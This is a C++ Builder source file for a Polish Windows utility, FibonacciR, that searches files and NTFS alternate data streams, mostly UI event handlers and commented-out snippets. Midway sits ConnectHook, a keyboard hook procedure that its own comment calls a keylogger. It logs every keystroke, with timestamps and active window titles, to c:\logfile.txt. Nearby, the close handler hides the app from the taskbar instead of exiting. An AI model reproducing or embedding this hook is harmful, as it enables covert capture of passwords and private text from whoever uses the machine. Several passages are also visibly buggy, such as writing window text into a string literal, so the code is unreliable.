//RawSMBIOSData *pFirmwareTableBuffer;
//
	unsigned retVal = GetSystemFirmwareTable('ACPI', 'PCAF', pFirmwareTableBuffer, BufferSize);


	ShowMessage(*pFirmwareTableBuffer->SMBIOSTableData);
	*/



//		pFirmwareTableBuffer;

//				   TForm *frm = new TForm(this);
//frm = CreateMessageDialog(FindStructure(0,0,0), mtCustom, TMsgDlgButtons() << mbOK);
//HRGN rgn;
//rgn = CreateRoundRectRgn(0, 0, frm->Width, frm->Height, 20, 20);
//SetWindowRgn(frm->Handle, rgn, true);
//DeleteObject(rgn);
//frm->ShowModal();



//W_ID = BeginThread(NULL, 0, Wyliczenia1, this, 0, W_PD);

//         for(int i = 0; i < 10000; i++)
// {
//  Label1->Caption = (AnsiString)i;
//  Application->ProcessMessages();
// }

//beginthread(zapis_z_watku,2*1024,NULL);


// String Dir;
// if(SelectDirectory(Dir, TSelectDirOpts() << sdAllowCreate << sdPerformCreate << sdPrompt, NULL))
//  Edit1->Text = Dir;



// long style = GetWindowLong(ProgressBar1->Handle, GWL_STYLE);
// style = style | PBS_MARQUEE;
// SetWindowLong(ProgressBar1->Handle, GWL_STYLE, style);
//
// // Rozpoczêcie odliczania
// ProgressBar1->Perform(PBM_SETMARQUEE, true, 100);
//
// for(int i = 0; i < 100; i++)
// {
//  ProgressBar1->Position += 1;
//  Sleep(100);
//  Application->ProcessMessages();
// }
// // Zakoñczenie odliczania
// ProgressBar1->Perform(PBM_SETMARQUEE, false, 100);



//SendMessage(hwnd_winamp,WM_USER,value,252);

//  MiniMaxi( BEGIN_MESSAGE_MAP);


//	 T.Show(StatusBar1);
//	 ShowMessage(T.ResultHinted());

//	}
}
//---------------------------------------------------------------------------
   void  TFibonacciR::closeTH( Nr)
   {
		if( thWatek[ Nr ] != NULL )			// Jeœli w¹tek istnieje, to go zamykamy (kolejne operacje)
	{
		thWatek[ Nr ]->Terminate(); 	// Wymuszamy zamkniêcie w¹tku
		thWatek[ Nr ]->WaitFor();     	// Czekamy, a¿ w¹tek siê zamknie (uruchomi wszystkie destruktory, itp.)

		delete thWatek[ Nr ]; 			// Kasujemy pamiêæ obiektu
		thWatek[ Nr ] = NULL;         	// Zerujemy wskaŸnik (¿eby nastepnym razem móc znów w³¹czyæ ten w¹tek, bo po NULL sprawdzamy, czy w¹tej jest, czy go nie ma)
	}

   }

//---------------------------------------------------------------------------

void TFibonacciR::SearchMultiThread()
{
//	for ( int i = 0; i < sizeof(thWatek)/4; i++) {
//
//		if( thWatek[ i ] == NULL )		// Jeœli w¹tku nie ma, to go stwórz
//		{
//			thWatek[ i ]  = new THsearch( true );	// Tutaj tworzymy w¹tek, stworzony w¹tek jest uœpiony
//
//			if ( thWatek[ i ] == NULL ) 		// Sprawdzamy, czy w¹tek uda³o siê stworzyæ poprawnie
//			{
//				ShowMessage( "Nie mo¿na stworzyæ w¹tku! nr" + (String)i );
//			}
//			else
//			{
//				thWatek[ i ]->Start();		// Startujemy w¹tek do dzia³ania
//			}
//		}
//	}

	if( thWatek[ 0 ] )	 closeTH(0);// thWatek[ 0 ]->Resume();

	if( thWatek[ 0 ] == NULL )		// Jeœli w¹tku nie ma, to go stwórz
		{
			thWatek[ 0 ]  = new THsearch( true );	// Tutaj tworzymy w¹tek, stworzony w¹tek jest uœpiony

			if ( thWatek[ 0 ] == NULL ) 		// Sprawdzamy, czy w¹tek uda³o siê stworzyæ poprawnie
			{
				ShowMessage( "Nie mo¿na stworzyæ w¹tku!" );
			}
			else
			{
				thWatek[ 0 ]->Start();		// Startujemy w¹tek do dzia³ania
			}
		}


//			ListView1->Hint =
// Search(ListView1, &(ButtonedEditSearch->Text), *filtr.get() );    // file data

//			ListView1->Hint = "Znaleziono plików: " + (int)ListView1->Items->Count;

//			ListView1->Hint = "Liczba ADS : " + (int)ListView1->Items->Count;



	ProgressBarMax();

	StatusInfo(  ListView1->Items->Count );
}
//---------------------------------------------------------------------------

void TFibonacciR::QuestionForADS() {

	ListView1->Show();
 if ( !filecolumn() ) {                                                         // dla kolumny strumieni
  if (ListView1->Items->Count == 0)
   if ( Form2->CheckBoxZoneId->Checked || Form2->CheckBoxNoDATA->Checked)
	if ( MessageBoxW (  Application->Handle, L"Nie znaleziono strumieni alternatywnych\n\nWY£¥CZYÆ filtry (Ustawienia->Wyszukiwanie) i wyszukaæ ponownie?\n(Bêd¹ równierz widoczne zwyk³e pliki)",
						( "FibonacciR (" + String(GetCurrentProcessId()) + ") ").c_str(),
						MB_ICONQUESTION | MB_YESNO ) == 6) {                     // == ID Yes

		Form2->CheckBoxZoneId->Checked = false;
		Form2->CheckBoxHideData->Checked = false;
		Form2->CheckBoxNoDATA->Checked = false;
		ButtonSzukajClick(0);
		ListView1->Hide();
	}
 }
}

//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonSzukajClick(TObject *Sender)
{

	ButtonSzukaj->Enabled = false;

	EditPathValid( (TEdit*)ButtonedEditSearch );
	ButtonedEditSearch->Hint = "Œcie¿ka do przeszukania| " + (String)ButtonedEditSearch->Text;

	ListView1->Clear();
	ListView1->Hint = "";

	Counter::size_files = 0;
	ResetIconList();

		SearchMultiThread();

	S::sDirectionSort = 0;

//	 ResetIconList();

	if ( ListView1->CanFocus() ) ListView1->SetFocus();

//	closeTH(0);   // ODWO£UJE nowa myœl// Uwaga jeœli nie zostanie zamkniêty ikony nie bêd¹ widoczne
//      ResetIconList();
//thWatek[0]->WaitFor();
//		ButtonSzukaj->Enabled  = !thWatek[0]->Suspended ;

	if (ListView1->Items->Count) {
		ListView1->Items->Item[0]->Focused = true;
		ListView1->Items->Item[0]->Selected = true;
	}

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Edit2KeyDown(TObject *Sender, WORD &Key, TShiftState Shift)
{
   if(Key == 13){
	ShowMessage("Wciœniêto kombinacjê klawiszy enter");
	ListBox1->Clear();
}
}
//---------------------------------------------------------------------------
 void __fastcall TFibonacciR::editExit(TObject *Sender) {

	static_cast<TEdit*>(Sender)->Hide();
}
//---------------------------------------------------------------------------
void __fastcall TFibonacciR::ListView1KeyPress(TObject *Sender, System::WideChar &Key)
{
////                 VK_SHIFT
//if (GetKeyState(VK_SHIFT) == 1) //{
//
//if ( Key == 102U  )ShowMessage("f");
//
//if ( Key == 6 ) ShowMessage("ctrl + f");
//
if ( Key == vkDelete  ) ShowMessage("df");


if ( Key == 6U  )                                                               // Ctrl + f
 {
	  edit->Show();                                      // edit do wyszukiwania
	  edit->Parent = StatusBar1;
	  edit->Height = StatusBar1->Height - 4;
	  edit->Top = 4;
	  edit->Width = 80;
	  edit->Left = StatusBar1->Width - edit->Width;
	  edit->BorderStyle=TFormBorderStyle::bsNone;
	  edit->MaxLength = 12;
	  edit->OnExit = editExit;
	  edit->OnChange = editOnChange;

	  edit->SetFocus();
	  edit->Text = "Wyszukaj";
	  edit->TextHint = "Szukaj";
	  edit->Perform(EM_SETSEL,0,8);


	}

}
//---------------------------------------------------------------------------
void __fastcall TFibonacciR::editOnChange(TObject *Sender) {      //I PRZESZUKIWANIE SUBITEMÓW

//	ListView1->Items->Item[0]->Selected = true;
//	edit->Text;
	if (ListView1->Items->Count) {

		short int *index = new short int;
		*index = ListView1->Perform(LB_FINDSTRING, -1,(LPARAM)edit->Text.c_str());
		if (*index != -1)  {
			ListView1->ItemIndex = *index;
//			ListView1->Color= clCream ;
		} else {
			ListView1->Selected = false;

		}
		delete index;
	}
//	 ShowMessage(ListBox1->Items->Text);

//ShowMessage(ListBox1->GetEnumerator());
}
//---------------------------------------------------------------------------
void __fastcall TFibonacciR::FormClose(TObject *Sender, TCloseAction &Action)
{
	if ( close) {                                                              	// jeœli true

		Action = caNone;                                                        // blokada zamkniêcia aplikacji
		Application->Minimize();
		ShowWindow(Application->Handle, SW_HIDE);                               // ukrywa ikonê na pasku zadañ
	}
}

//---------------------------------------------------------------------------
void __fastcall TFibonacciR::podpowiedzi1Click(TObject *Sender)
{
	podpowiedzi1->Checked = !podpowiedzi1->Checked;

		ListBox1->ShowHint 				= podpowiedzi1->Checked;
		ButtonedEditSearch->ShowHint 	= podpowiedzi1->Checked;
		podpowiedzi1->Checked 			= podpowiedzi1->Checked;
		BalloonHint1->Style = (podpowiedzi1->Checked) ? bhsBalloon : bhsStandard;
}
// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::Timer1Timer(TObject *Sender)
{
	ProgressBarMax();
	  OnTimer(Sender);
}
// ---------------------------------------------------------------------------

void __fastcall TFibonacciR::Zawszenawierzchu1Click(TObject *Sender) {

Zawszenawierzchu1->Checked = !Zawszenawierzchu1->Checked;


	if (Zawszenawierzchu1->Checked)
	{
		FibonacciR->FormStyle = TFormStyle::fsStayOnTop;
		FibonacciR->BorderStyle = TFormBorderStyle::bsSizeable;
		Form2->FormStyle = TFormStyle::fsStayOnTop;
		DeleteMenu( GetSystemMenu(Handle, TRUE), SC_MAXIMIZE, MF_BYCOMMAND);

	} else {

//		FibonacciR->FormStyle = TFormStyle::fsMDIForm::fsNormal;
		FibonacciR->FormStyle = TFormStyle::fsNormal;
		Form2->FormStyle = TFormStyle::fsNormal;
		FibonacciR->BorderStyle = TFormBorderStyle::bsSingle;
		DeleteMenu( GetSystemMenu(Handle, FALSE), SC_MAXIMIZE, MF_BYCOMMAND);
	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::FormKeyUp(TObject *Sender, WORD &Key, TShiftState Shift)

{
if (GetKeyState(vkEscape)== 0) {
				   ShowMessage("vkShift");
}
//ShowMessage(Shift.ToInt());
}
//---------------------------------------------------------------------------

   void __fastcall TFibonacciR::AppIdle(System::TObject *Sender, bool &Done)
{
  	if (thWatek[0] != NULL)
	{
//		thWatek[0]->WaitFor();
		ButtonSzukaj->Enabled  = !thWatek[0]->Suspended ;
	} else ButtonSzukaj->Enabled  = true;

// for(int i = 0; i <= 10; i++)
 {
//  Caption = (AnsiString)i;
  Application->ProcessMessages();
 }
}

//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ListBox1DrawItem(TWinControl *Control, int Index, TRect &Rect, TOwnerDrawState State)
{
 TListBox *pListbox = dynamic_cast<TListBox*>(Control);
 TCanvas *pCanvas = pListbox->Canvas;
// TCanvas *pCanvas = dynamic_cast<TListBox*>(Control)->Canvas;
 if(Index%2)
 {
  pCanvas->Brush->Color = clBlack;
   pCanvas->Brush->Style = bsFDiagonal ;
  pCanvas->Font->Color = clWhite;
 }

 pCanvas->FillRect(Rect);
 pCanvas->TextRect(Rect, Rect.Left,Rect.Top, pListbox->Items->Strings[Index]);
}
//---------------------------------------------------------------------------
void __fastcall TFibonacciR::WmCopyData(TWMCopyData& Message)                    // tylko pierwsza pozycja stringa
{
//        ShowMessage( (char*) Message.CopyDataStruct->lpData );
AnsiString slCmdLine =  (char*)Message.CopyDataStruct->lpData;

switch ( Message.Msg )
{
	case WM_COPYDATA: {

	COPYDATASTRUCT* copy_data = (COPYDATASTRUCT*)(Message.CopyDataStruct);

	const char* str = (const char*)(copy_data->lpData);
	const char* buff;
	slCmdLine.printf("Message (%u): %.*s\n", copy_data->dwData, (int)copy_data->cbData, str);


//	buff
	/* Also fixed the parameter list for "%.*s" */
//	printf("Message (%u): %.*s\n", copy_data->dwData, (int)copy_data->cbData, str);
	  break;
	}

	case WM_DROPFILES:
	/*
int nFiles;
	char szTemp64x[500] = {0};
	char path[1024] = {0};
	GetDlgItemText(hwnd, IDC_PATH, path, 1024);

	switch (message)
	{
	case WM_DROPFILES:

		nFiles = DragQueryFile((HDROP) wParam, 0xFFFFFFFF, (LPSTR) NULL, 0);
		for (int i = 0; i < nFiles; i++)
		{
			DragQueryFile((HDROP) wParam, i, szTemp64x, 499);
			char* pFile = strrchr(szTemp64x, '\\');
			pFile++;

			strcat(path, pFile);
			UploadFile((unsigned char *)szTemp64x, (unsigned char *)path);
			path[0] = '\0';
			//Refresh files in selected dir

		}

		DragFinish((HDROP)wParam);
		break;
	}
*/
 break;
}
																 // (AnsiString&)Message.CopyDataStruct->lpData


//printf( (const char*)Message.CopyDataStruct->lpData );

int some_value = *((int *) Message.CopyDataStruct->lpData); /* ok */

  ShowMessage(slCmdLine + "\n" + some_value);
 if(Memo1->Modified)
 {
  __int16 idx = Application->MessageBox(L"Czy chcesz zapisaæ zmiany w pliku", L"Zapisywanie pliku", MB_YESNOCANCEL | MB_ICONQUESTION);
  switch(idx)
  {
   case ID_YES: Memo1->Lines->SaveToFile(OldPathFile); break;
   case ID_NO: break;
   case ID_CANCEL: return;
  }
 }

 Memo1->Lines->LoadFromFile(slCmdLine);

 OldPathFile = slCmdLine;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Button2MouseDown(TObject *Sender, TMouseButton Button,
		  TShiftState Shift, int X, int Y) {

//  ReleaseCapture();
   SendMessage(Button2->Handle, WM_SYSCOMMAND, 0xF012, 0);
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::WindowClose1Execute(TObject *Sender)
{
exit(1);
}
//---------------------------------------------------------------------------
 TNotifyEvent __fastcall TFibonacciR::OnTimer(TObject *Sender)
{
HWND hWnd;
if (RadioButtonParent->Checked)   hWnd   = GetAncestor(WindowFromPoint(Mouse->CursorPos), GA_PARENT  );
else if (RadioButtonRoot->Checked)  hWnd = GetAncestor(WindowFromPoint(Mouse->CursorPos), GA_ROOT );
else if (RadioButtonOwner->Checked)  hWnd = GetAncestor(WindowFromPoint(Mouse->CursorPos), GA_ROOTOWNER  );

 char *Buf = "";
 int l = GetWindowTextLength(hWnd) + 1;
 GetWindowTextA(hWnd, Buf, l);

 if(l <= 1)
 {
  hWnd = WindowFromPoint(Mouse->CursorPos);
  l = GetWindowTextLength(hWnd) + 1;
  GetWindowTextA(hWnd, Buf, l);
 }

 EditCurrsor->Text = (String)Buf;

 Application->Name = (String)Buf;

}
//GA_PARENT - zwraca uchwyt do rodzica obiektu przekazanego jako argument, je¿eli pierwszym w kolejnoœci "rodzicem" (parent) nie jest okno programu lecz inny obiekt (np. Panel), to zwrócony zostanie uchwyt do tego obiektu, a nie do okna.
//
//GA_ROOT - zwraca uchwyt do okna obiektu przekazanego jako argument, poprzez przejœcie przez kolejnych "rodziców" (parent) wskazanego obiektu, a¿ natrafi na okno.
//
//GA_ROOTOWNER - podobnie jak GA_ROOT, lecz zwracany jest od razu uchwyt do okna potomnego - nie wiem dok³adnie jak to z tym jest.
//---------------------------------------------------------------------------
// void __fastcall TFibonacciR::GetKeyApp(TMessage &Msg)
//{
// if(Msg.Msg == WM_KEYDOWN)                       // wywo³uje bug "nieprawid³owe dojœcie okna"
// {
//   if( GetKeyState(VK_CONTROL) < 0 )
//   {
//   ShowMessage("Wciœniêto Ctrl");
//   }
// }
//
// if(Msg.Msg == WM_KEYUP)
// {
//   if( GetKeyState(VK_CONTROL) < 0 )
//   {
//   ShowMessage("Zwolniono Ctrl");
//   }
// }
//
// KeyApp(Msg);
//}
//---------------------------------------------------------------------------
HOOKPROC ConnectHook(int iCode, WPARAM wParam, LPARAM lParam)
{
 if(iCode < 0) return (HOOKPROC)CallNextHookEx(g_hLogHook, iCode, wParam, lParam);

 EVENTMSG *pEvt = (EVENTMSG *)lParam;
 int i;
 HWND hFocus;
 char szTitle[256];
 char szTime[128];
 FILE *stream = fopen("c:\\logfile.txt", "a+t"); //rejestr keylogera zostaje zapisany w pliku logfile.txt na dysku c:

 if(pEvt->message == WM_KEYDOWN)
 {         // ShowMessage(1);

 FibonacciR->Memo1->Text += "text ";
  int vKey = LOBYTE(pEvt->paramL);
  char ch;
  char str[10];
  hFocus = GetActiveWindow();

  if(g_hLastFocus != hFocus)
  {
   GetWindowTextA(hFocus, szTitle, 256);
   g_hLastFocus = hFocus;
   strcpy(  szTime, ((AnsiString)DateTimeToStr(Now())).c_str());
   fprintf(stream, "%c%s%c%c%s%s", 10, szTime, 32, 32, szTitle, ":");
   fprintf(stream, "%c%c", 32, 32);
  }

  int iShift   = GetKeyState(0x10);
  int iCapital = GetKeyState(0x14);
  int iNumLock = GetKeyState(0x90);

  bool bShift   = (iShift & KeyPressMask) == KeyPressMask;
  bool bCapital = (iCapital & 1) == 1;
  bool bNumLock = (iNumLock & 1) == 1;

  if(vKey >= 48 && vKey <= 57)
  if(!bShift) fprintf(stream, "%c", vKey);

  if(vKey >= 65 && vKey <= 90)
  {
   if(!bCapital)
   {
    if(bShift)
    {
     ch = vKey;
    }
    else
    {
     ch = vKey + 32;
    }
   }
   else
    if(bShift)
    {
     ch = vKey + 32;
    }
    else
    {
     ch = vKey;
    }
    fprintf(stream, "%c", ch);
   }

   if(vKey >= 96 && vKey <= 105)
   if(bNumLock) fprintf(stream, "%c", vKey - 96 + 48);
   if(vKey >= 186 && vKey <= 222)
   {
    switch(vKey)
    {
     case 186: if(!bShift) ch = ';';  else ch = ':';   break;
     case 187: if(!bShift) ch = '=';  else ch = '+';   break;
     case 188: if(!bShift) ch = ',';  else ch = '<';   break;
     case 189: if(!bShift) ch = '-';  else ch = '_';   break;
     case 190: if(!bShift) ch = '.';  else ch = '>';   break;
     case 191: if(!bShift) ch = '/';  else ch = '?';   break;
     case 192: if(!bShift) ch = '`';  else ch = '~';   break;
     case 219: if(!bShift) ch = '[';  else ch = '{';   break;
     case 220: if(!bShift) ch = '\\'; else ch = '?';   break;
     case 221: if(!bShift) ch = ']';  else ch = '}';   break;
     case 222: if(!bShift) ch = '\''; else ch = '\"';  break;
     default: ch = 'n'; break;
    }
    if(ch != 'n') fprintf(stream, "%c", ch);
   }
   if(vKey >= 8 && vKey <= 46)
   {
    switch(vKey)
    {
     case 8:  strcpy(str, "[BK]");   break;
     case 9:  strcpy(str, "[TAB]");  break;
     case 13: strcpy(str, "[EN]");   break; // ENTER
     case 17: strcpy(str, "[rALT]"); break; // prawy ALT
     // case 18: strcpy(str, "[lALT]"); break; // lewy ALT
     case 32: strcpy(str, " ");      break; // spacja
     case 33: strcpy(str, "[PU]");   break;
     case 34: strcpy(str, "[PD]");   break;
     case 35: strcpy(str, "[END]");  break;
     case 36: strcpy(str, "[HOME]"); break;
     case 37: strcpy(str, "[LF]");   break;
     case 38: strcpy(str, "[UF]");   break;
     case 39: strcpy(str, "[RF]");   break;
     case 40: strcpy(str, "[DF]");   break;
     case 45: strcpy(str, "[INS]");  break;
	 case 46: strcpy(str, "[DEL]"); ShowMessage("del"); break;
     default: ch = 'n'; break;
    }
    if(ch != 'n') fprintf(stream, "%s", str);
   }
   if(bShift && vKey == 123)
   {
    Application->Restore();
    ShowWindow(Application->Handle, SW_SHOW);

    if(g_hLogHook != NULL)
    {
     UnhookWindowsHookEx(g_hLogHook);
     g_hLogHook = NULL;
	}
   }
  }
  if(pEvt->message == WM_LBUTTONDOWN && pEvt->message == WM_RBUTTONDOWN)
  {
   hFocus = GetActiveWindow();
   if(g_hLastFocus != hFocus)
   {
    g_hLastFocus = hFocus;
	GetWindowTextA(hFocus, ((AnsiString)szTitle).c_str(), 256);
	strcpy(szTime, ((AnsiString)DateTimeToStr(Now())).c_str());
	fprintf(stream, "%c%s%c%c%s%s", 10, szTime, 32, 32, szTitle, ":");
	fprintf(stream, "%c%c", 32, 32);
	FibonacciR->Memo1->Text += szTime;
   }
  }
  fclose(stream);

  return (HOOKPROC)CallNextHookEx (g_hLogHook, iCode, wParam, lParam);
}

void __fastcall TFibonacciR::ListView1Click(TObject *Sender)
{

if (ListView1->Items->Count) {
	if ( ListView1->ItemIndex > -1) {                                           // b³¹d pamieci jesli nie ma ifa
//			StatusInfo( ListView1->Selected->ImageIndex );
//	   TMsgDlgButtons a;
//							 CreateMessageDialog("nn",mtError,a,mbOK);


 ListView1->Selected->Index;
//									System::Win::Taskbar::TWinTaskbar::SetThumbnailTooltip( (String)"MOJEA" );//Dialogs::ShowMesage(0);
// ListView1->ItemFocused->Checked = !ListView1->ItemFocused->Checked;

 if ( GetAsyncKeyState(vkControl) ) {

 ListView1->ShowHint = false;

	if (filecolumn()) {

		ListView1->Hint = Getpath(ListView1->ItemFocused->Caption,1) + ListView1->ItemFocused->SubItems->Strings[0];

	} else {

		ListView1->Hint = ListView1->ItemFocused->Caption + ListView1->ItemFocused->SubItems->Strings[0];

	}
 }
//ListView1->Selected->SubItems->Text;
//ListView1->Selected->Index;

//	ShowMessage(
//		  ListView1->ItemFocused->SubItems->Strings[0]
//		  ListView1->Selected->SubItems->GetText()
//	);

	}

}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::PopupMenuListViewPopup(TObject *Sender)
{
	unique_ptr<unsigned char>b(new unsigned char(filecolumn()));

	Otwrz1->Visible  		= *b;
	Otwrzz1->Visible 		= !*b; //todo
	Podglad->Visible 		= true;
	Eksportujlist1->Visible = !*b;

	Utwrzskrt1->Visible 	= *b;
	Zapisz1->Visible 		= !*b;

	Usu1->Visible 	 		= true;
	Usuzaznaczone1->Visible = ListView1->Checkboxes;
	Usuwszystko1->Visible 	= true;

	Zaawansowane1->Visible 	= true;
	Kopiujciek1->Visible 	= true;
	Kopiuj1->Visible 		= true;
	SzukajADS1->Visible 	= *b;
	DopiszADS1->Visible 	= *b;
	Waciwoi1->Visible 		= true;

 if (ListView1->Items->Count) {
	if ( ListView1->ItemIndex > -1)

	ItemAble(1);

		// PopupMenuListView->Items[PopupMenuListView->Items->Items->Count]->Enabled =
		// ( ListView1->Column[1]->Caption == "Nazwa pliku" ) ? true : false;
		// PopupMenuListView->SetSubComponent(false);// = (ListView1->Items->Count > 1) ? false : false;

		if (!ListView1->SelCount) 	ItemAble(0);                    // jeœli nic nie jest zaznaczone

		} else ItemAble(0);  PopupMenuListView->CloseMenu();
}
//---------------------------------------------------------------------------

void TFibonacciR::ItemAble(bool e ){

	Otwrz1->Enabled 		= e;
	Otwrzz1->Enabled 		= e;
	Podglad->Enabled 		= e;
	Eksportujlist1->Enabled = e;
	Utwrzskrt1->Enabled 	= e;
	if ( e )
		 Zapisz1->Enabled 	= ( filecolumn() ) ? false : true;                  // skrót zapisu ma dzia³aæ tylko dla ADS
	else Zapisz1->Enabled 	= e;
	Usu2->Enabled 			= e;
	Usuzaznaczone1->Enabled = e;
	Usuwszystko1->Enabled 	= e;
	Zaawansowane1->Enabled 	= e;
    Kopiujciek1->Enabled   	= e;
	Waciwoi1->Enabled 		= e;

}
// ---------------------------------------------------------------------------

void __fastcall TFibonacciR::Waciwoi1AdvancedDrawItem(TObject *Sender, TCanvas *ACanvas, TRect &ARect, TOwnerDrawState State)
{
	Waciwoi1->Visible = true;//( ListView1->Column[1]->Caption == "Nazwa pliku" ) ? true : false;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::PodgladClick(TObject *Sender)
{
 if ( filecolumn() )
//WinExec( (AnsiString("explorer.exe /select, " + Getpath(ListView1->ItemFocused->Caption,0) +"\\"+ ListView1->ItemFocused->SubItems->Strings[0])).c_str(), SW_SHOWNORMAL);//ShellExecuteA(0, "open", ((AnsiString)ListView1->ItemFocused->Caption+"\\").c_str() , "", "", 5);
//ShellExecuteA(0, "find", ((AnsiString) Getpath(ListView1->ItemFocused->Caption,1) + ListView1->ItemFocused->SubItems->Strings[0]).c_str() , "", ((AnsiString)ListView1->ItemFocused->Caption).c_str(), 5);
	OpenFolderSelectFile( (Getpath(ListView1->ItemFocused->Caption,1) +
						   ListView1->ItemFocused->SubItems->Strings[0]).c_str() );
 else
//WinExec( (AnsiString("explorer.exe /select, " + ListView1->ItemFocused->Caption)).c_str(), SW_SHOWNORMAL);//ShellExecuteA(0, "open", ((AnsiString)ListView1->ItemFocused->Caption+"\\").c_str() , "", "", 5);
	OpenFolderSelectFile( (ListView1->ItemFocused->Caption).c_str() );		  	// best way
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Waciwoi1Click(TObject *Sender)
{

if (filecolumn()) {

	 Properties(&(ListView1->ItemFocused->Caption), &(ListView1->ItemFocused->SubItems->Strings[0]), false);

	 ShowProperties( ListView1->ItemFocused->Caption +"\\"+ ListView1->ItemFocused->SubItems->Strings[0] );

} else

	Properties(&(ListView1->ItemFocused->Caption), &(ListView1->ItemFocused->SubItems->Strings[0]), true);

//Properties( &(ListView1->ItemFocused->Caption +"\\"+ ListView1->ItemFocused->SubItems->Strings[0]) ,1);
// ShowProperties( ListView1->ItemFocused->Caption +"\\"+ ListView1->ItemFocused->SubItems->Strings[0] );
// ShellExecuteA( Application->Handle, "properties", ((AnsiString)ListView1->ItemFocused->Caption+"\\"+ ListView1->ItemFocused->SubItems->Strings[0]).c_str() , "", "", 5);
//ShellExecuteA( Application->Handle, "properties", ((AnsiString)ListView1->ItemFocused->Caption+ ListView1->ItemFocused->SubItems->Strings[0]).c_str() , "", "", 5);

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Otwrz1Click(TObject *Sender)
{
	// only for files
ShellExecuteA(0, "open", ((AnsiString) Getpath(ListView1->ItemFocused->Caption)
			+ ListView1->ItemFocused->SubItems->Strings[0]).c_str() , "", "", 5);
//ShellExecuteA(0, "open", ((AnsiString)ListView1->ItemFocused->Caption+ ListView1->ItemFocused->SubItems->Strings[0]).c_str() , "", "", 5);
//	ShowMessage( ListView1->ItemFocused->Caption+ ListView1->ItemFocused->SubItems->Strings[0]) ;
//system(((AnsiString)ListView1->ItemFocused->Caption+ ListView1->ItemFocused->SubItems->Strings[0]).c_str());


}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ListView1DblClick(TObject *Sender)
{

  if ( ListView1->ItemFocused ) {

  if ( GetAsyncKeyState( VK_MENU ) )                                            // jeœli wciœniêty alt otwiera okno w³aœciwoœci
  {
		Properties( &(ListView1->ItemFocused->Caption), &(ListView1->ItemFocused->SubItems->Strings[0]), !filecolumn() );
 		return;
  }

	if ( filecolumn() ) {


			ShellExecuteA(0, "open", ((AnsiString) Getpath(ListView1->ItemFocused->Caption) +
			ListView1->ItemFocused->SubItems->Strings[0]).c_str(), "", "", 5);

	}	else {

	if (WinExec(((AnsiString)ListView1->ItemFocused->Caption +                   // dzia³a w przypadku uruchomienia programu
			ListView1->ItemFocused->SubItems->Strings[0]).c_str(),1)  <= 31) {    // jeœli siê nie powiod³o to poni¿sze

	 if (	ListView1->ItemFocused->SubItems->Strings[0] == "::$DATA") {

		Shel( 0, "open", ((AnsiString) ListView1->ItemFocused->Caption).c_str(), "", "", 5);  // Zwyk³y plik
		return;
	}
   }
			// if have extension
//		unique_ptr<wchar_t[MAX_PATH]> Exec(new wchar_t);        /bug
//		String Exec;
		unique_ptr<String> path(new String( "TEMP" +
				GetExtension( ListView1->ItemFocused->SubItems->Strings[0],1,10) )); // rozszerzenie pliku
		wchar_t Exec[255];

		// bez closehanle pliki po zamkniêciu aplikacji automatycznie siê usun¹
		CloseHandle( CreateFileW( (*path).c_str(), 0, 0, NULL, CREATE_ALWAYS, 258, 0));     // 256 tymczasowy + 2 ukryty (atrybuty pliku)

	  FindExecutableW( ( ExtractFilePath(ParamStr(0)) + *path).c_str(), NULL, Exec);

		DeleteFileW( (*path).c_str() );
			// if name is ::data
			*path = ListView1->ItemFocused->Caption + ListView1->ItemFocused->SubItems->Strings[0];
																			   // przypisanie nowej wartoœci
//						 ShowMessage(*path.get());
		if ( (String)Exec != "") ExecuteApp( (String)Exec + " " + *path);       // uruchomienie przez program skojarzony z rozszerzeniem

		else ExecuteApp( Form2->LabelDefProgPath->Caption + " " + *path);		// ADS zostanie otwarty przez zdefiniowany w programie domyœlny program np. notepad.exe

	 }
	}
		if (FibonacciR->FormStyle == fsStayOnTop ) {
			if ( FibonacciR->WindowState == wsMaximized ) {
			AlphaBlend = true;
				for (int i = 255; i > 0; i--) {

					AlphaBlendValue = i;
					Sleep(3);
				}

				Sleep(1000);

				for (int i = 0; i < 255; i++) {
					AlphaBlendValue = i;
					Sleep(2);

				}
			}
			AlphaBlend = false;
		}
	}

// ---------------------------------------------------------------------------

void __fastcall TFibonacciR::FormDestroy(TObject *Sender)
{
	Close_Points_WND();
	P1->Close();
	P2->Close();;
	delete  ProgressBar1, ImageSave, edit, IconList, FiInt, FiFloat, GdiPlus;                // czas
	Reg->Free();
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Zdjcia1Click(TObject *Sender)
{
ExecuteFiltrSearch("*.jpg; *.jpeg; *.png; *.bmp; *.gif; *.tif; *.tiff; *.ico; *.emf; *.wmf; *.psd;");
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Usu2Click(TObject *Sender)
{

if ( filecolumn() ) {
		// ShowMessage((AnsiString)ListView1->ItemFocused->Caption+"\\"+
		// ListView1->ItemFocused->SubItems->Strings[0]);
		if ( DeleteFileA(((AnsiString) Getpath(ListView1->ItemFocused->Caption) +
			ListView1->ItemFocused->SubItems->Strings[0]).c_str()))
			{
		StatusInfo(("Usuniêto: " + (AnsiString)ListView1->ItemFocused->Caption +
			"\\" + ListView1->ItemFocused->SubItems->Strings[0]).c_str());
			ListView1->ItemFocused->Delete();
			} else
			StatusInfo(("Nie usuniêto: " + (AnsiString)ListView1->ItemFocused->Caption +
			"\\" + ListView1->ItemFocused->SubItems->Strings[0]).c_str());
	}
	else {

		if ( !remove( AnsiString( Getpath(ListView1->ItemFocused->Caption, 0) + ListView1->ItemFocused->SubItems->Strings[0]).c_str() ))
		{
			StatusInfo( ("Usuniêto: " + (AnsiString) Getpath(ListView1->ItemFocused->Caption, 0) +
				ListView1->ItemFocused->SubItems->Strings[0]).c_str());
				ListView1->ItemFocused->Delete();
		} else
			StatusInfo( ("Nie usuniêto: " + (AnsiString) Getpath(ListView1->ItemFocused->Caption, 0) +
				ListView1->ItemFocused->SubItems->Strings[0]).c_str());
	}
	ListView1->Hint = StatusBar1->Panels->Items[0]->Text ;
	calcSizeOfList();
}
